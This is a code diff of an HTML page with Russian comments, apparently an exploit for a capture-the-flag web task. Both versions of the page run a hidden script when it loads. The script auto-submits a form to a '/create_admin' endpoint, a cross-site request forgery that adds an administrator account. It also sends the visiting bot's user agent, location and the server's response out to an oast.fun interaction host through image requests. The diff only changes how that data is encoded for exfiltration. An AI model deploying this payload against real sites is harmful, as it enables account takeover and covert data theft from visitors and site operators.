@@ -1,76 +1,57 @@
 <!DOCTYPE html>
 <html>
 <body>
+<iframe id="sink" name="sink" style="display:none"></iframe>
+
 <script>
-// Функция для отправки небольших чанков
-function sendChunk(label, data, chunkIndex) {
-    const encoded = btoa(JSON.stringify(data)).replace(/[+/=]/g, '').substring(0, 40);
-    const subdomain = `${label}${chunkIndex}-${encoded}`;
-    new Image().src = `https://${subdomain}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
-}
+(async () => {
+  const OAST = "https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun";
 
-// 1. Отправляем информацию о боте (маленькими порциями)
-const botInfo = {
-    ua: navigator.userAgent.substring(0, 100),
-    url: window.location.href,
-    time: new Date().toISOString()
-};
-sendChunk('bot', botInfo, 0);
+  function exfil(tag, data) {
+    const enc = btoa(unescape(encodeURIComponent(data)));
+    new Image().src = `${OAST}/${tag}?d=${encodeURIComponent(enc)}`;
+  }
 
-// 2. Создаем iframe
-const iframe = document.createElement('iframe');
-iframe.name = 'responseFrame';
-iframe.id = 'responseFrame';
-iframe.style.display = 'none';
-document.body.appendChild(iframe);
+  /* 1️⃣ инфа о боте */
+  exfil("bot",
+    JSON.stringify({
+      ua: navigator.userAgent,
+      lang: navigator.language,
+      time: new Date().toISOString(),
+      url: location.href
+    })
+  );
 
-// 3. Создаем и отправляем форму
-const form = document.createElement('form');
-form.method = 'POST';
-form.action = 'https://tasks.goidactf.ru:20246/create_admin';
-form.target = 'responseFrame';
-form.style.display = 'none';
+  /* 2️⃣ POST create_admin через iframe */
+  const form = document.createElement("form");
+  form.method = "POST";
+  form.action = "https://tasks.goidactf.ru:20246/create_admin";
+  form.target = "sink";
 
-const input = document.createElement('input');
-input.type = 'hidden';
-input.name = 'new_admin_login';
-input.value = 'chunked_admin_' + Date.now();
-form.appendChild(input);
+  const input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "new_admin_login";
+  input.value = "ctfadmin_" + Date.now();
 
-document.body.appendChild(form);
-form.submit();
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
 
-// 4. Сообщаем что форма отправлена
-sendChunk('status', {event: 'form_submitted'}, 0);
+  exfil("state", "form_submitted");
 
-// 5. Пытаемся прочитать ответ через 2 секунды
-setTimeout(() => {
+  /* 3️⃣ пробуем прочитать ответ */
+  setTimeout(() => {
     try {
-        const frame = document.getElementById('responseFrame');
-        const frameDoc = frame.contentDocument || frame.contentWindow.document;
-        
-        let responseText = 'no_body';
-        if (frameDoc && frameDoc.body) {
-            responseText = frameDoc.body.textContent || 'empty_body';
-        }
-        
-        // Разбиваем ответ на части если большой
-        const maxChunkLength = 100;
-        for (let i = 0; i < responseText.length; i += maxChunkLength) {
-            const chunk = {
-                part: Math.floor(i / maxChunkLength),
-                total: Math.ceil(responseText.length / maxChunkLength),
-                text: responseText.substring(i, i + maxChunkLength),
-                timestamp: new Date().toISOString()
-            };
-            
-            sendChunk('resp', chunk, Math.floor(i / maxChunkLength));
-        }
-        
-    } catch(e) {
-        sendChunk('err', {error: e.toString().substring(0, 50)}, 0);
+      const frame = document.getElementById("sink");
+      const doc = frame.contentDocument || frame.contentWindow.document;
+      const body = doc?.body?.innerText || "EMPTY_BODY";
+      exfil("response", body);
+    } catch (e) {
+      exfil("error", e.toString());
     }
-}, 2000);
+  }, 2000);
+
+})();
 </script>
 </body>
 </html>
